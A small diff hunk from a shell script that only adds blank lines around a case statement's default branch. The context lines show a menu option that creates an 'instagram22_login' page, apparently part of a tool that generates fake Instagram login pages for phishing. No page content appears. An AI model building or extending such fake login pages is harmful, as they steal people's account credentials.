@@ -1313,7 +1313,9 @@ case $choice in
         page="instagram22_login"
         create_page "$page" "$(Instagram22_page)"
         ;;
+     
       *)
+      
         echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
         exit 1
         ;;
